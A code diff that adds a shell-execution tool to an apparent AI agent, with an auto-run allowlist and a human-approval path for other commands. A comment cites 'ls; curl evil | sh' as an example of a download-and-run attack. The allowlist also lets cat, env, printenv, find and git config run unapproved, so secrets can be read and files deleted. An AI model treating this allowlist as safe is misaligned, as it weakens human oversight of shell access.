@@ -17,6 +17,8 @@ lazily constructs the LangGraph ReAct agent on top of it.
 from __future__ import annotations
 
 import json
+import os
+import re
 import shutil
 import time
 from pathlib import Path
@@ -70,7 +72,8 @@ GOVERNOR_SYSTEM = (
     "- Map requests to tools, e.g.: 'what workflows do I have' / 'list my "
     "workflows' → list_workflows; 'run the morning briefing' → run_workflow; "
     "'what tools are there' → list_tools; 'is everything healthy' / 'system "
-    "status' → get_status; 'what ran recently' → get_runs.\n"
+    "status' → get_status; 'what ran recently' → get_runs; 'run <command>' / "
+    "'what's in this folder' / any shell/terminal request → run_shell.\n"
     "- If no tool fits, say so plainly instead of inventing an answer.\n\n"
     "Be concise. State what you did and the outcome."
 )
@@ -86,6 +89,66 @@ def _default_deny(action_type: str, description: str) -> str:  # pragma: no cove
 
 def _noop_event(phase: str, tool: str, info: dict) -> None:  # pragma: no cover
     return None
+
+
+# --------------------------------------------------------------------------- #
+# Shell execution (run_shell tool) — allowlist-auto, approve-the-rest.
+# --------------------------------------------------------------------------- #
+# Read-only commands that may run WITHOUT human approval. Anything else (or any
+# command using shell chaining/redirect/substitution) takes the approval path.
+_SAFE_SHELL_CMDS = frozenset({
+    "ls", "pwd", "cat", "echo", "date", "whoami", "uname", "hostname", "id",
+    "head", "tail", "wc", "grep", "egrep", "fgrep", "find", "which", "type",
+    "tree", "stat", "file", "df", "du", "ps", "env", "printenv", "uptime",
+    "cal", "history", "man", "help", "uptime", "sw_vers", "arch",
+})
+# Read-only git subcommands that are safe to auto-run.
+_SAFE_GIT_SUBCMDS = frozenset({
+    "status", "log", "diff", "show", "branch", "remote", "describe", "config",
+})
+# Shell metacharacters that chain/redirect/substitute — their presence forces
+# the approval path even if the leading command looks safe (prevents e.g.
+# "ls; curl evil | sh" from sneaking through on the "ls" allowlist).
+_SHELL_META = re.compile(r"[;&|><`]|\$\(")
+
+
+def _is_safe_shell(command: str) -> bool:
+    """True if ``command`` is a read-only, single, un-chained command."""
+    if _SHELL_META.search(command):
+        return False
+    parts = command.split()
+    if not parts:
+        return False
+    first = parts[0]
+    if first == "git":
+        return len(parts) > 1 and parts[1] in _SAFE_GIT_SUBCMDS
+    return first in _SAFE_SHELL_CMDS
+
+
+def _exec_shell(command: str, *, timeout: int = 30, max_chars: int = 4000) -> str:
+    """Run ``command`` in the user's home dir, return combined output + exit code.
+
+    Uses the shell so pipes/globs behave terminal-like; the Constitution's
+    blocked-pattern check (run before this) refuses the worst payloads, and
+    non-allowlisted commands require human approval upstream.
+    """
+    import subprocess
+
+    home = os.path.expanduser("~")
+    try:
+        proc = subprocess.run(  # noqa: S602 — intentional shell; guarded upstream
+            command, shell=True, cwd=home,
+            capture_output=True, text=True, timeout=timeout,
+        )
+    except subprocess.TimeoutExpired:
+        return f"$ {command}\nERROR: timed out after {timeout}s"
+    except Exception as exc:  # noqa: BLE001
+        return f"$ {command}\nERROR: {exc}"
+    out = ((proc.stdout or "") + (proc.stderr or "")).strip()
+    if len(out) > max_chars:
+        out = out[:max_chars] + f"\n…(truncated; {len(out)} chars total)"
+    tail = f"[exit {proc.returncode}]"
+    return f"$ {command}\n{out}\n{tail}" if out else f"$ {command}\n{tail}"
 
 
 class GovernorToolbox:
@@ -231,6 +294,32 @@ class GovernorToolbox:
 
         return self._guarded("api_call_external", f"{name} {args_json}", _do)
 
+    # --------------------------------------------------------------- shell
+    def run_shell(self, command: str) -> str:
+        """Run a terminal command and return its output (stdout+stderr + exit
+        code). Commands run in the user's home directory. Read-only/safe
+        commands (ls, cat, pwd, grep, find, git status/log/diff, …) run
+        immediately; anything else — or any command that chains, pipes, or
+        redirects — requires human approval first. Use this to inspect or
+        operate the machine on the user's behalf.
+        """
+        cmd = (command or "").strip()
+        if not cmd:
+            return "ERROR: empty command."
+
+        def _do() -> str:
+            return _exec_shell(cmd)
+
+        if _is_safe_shell(cmd):
+            # Allowlisted: still enforce blocked patterns, but skip approval.
+            try:
+                self.constitution.guard("shell_exec", cmd, approved=True)
+            except ConstitutionViolation as cv:
+                return f"BLOCKED: {cv}"
+            return self._run("shell_exec", cmd, _do)
+        # Everything else: full guard → human approval (and blocked-pattern check).
+        return self._guarded("shell_exec", cmd, _do)
+
     # -------------------------------------------------------------- memory
     def remember(self, note: str) -> str:
         """Save a durable fact, preference, or piece of context to long-term
@@ -346,6 +435,7 @@ def build_tools(toolbox: GovernorToolbox) -> list:
         (toolbox.get_runs, "get_runs"),
         (toolbox.run_workflow, "run_workflow"),
         (toolbox.call_tool, "call_tool"),
+        (toolbox.run_shell, "run_shell"),
         (toolbox.remember, "remember"),
         (toolbox.write_config, "write_config"),
         (toolbox.edit_workflow, "edit_workflow"),
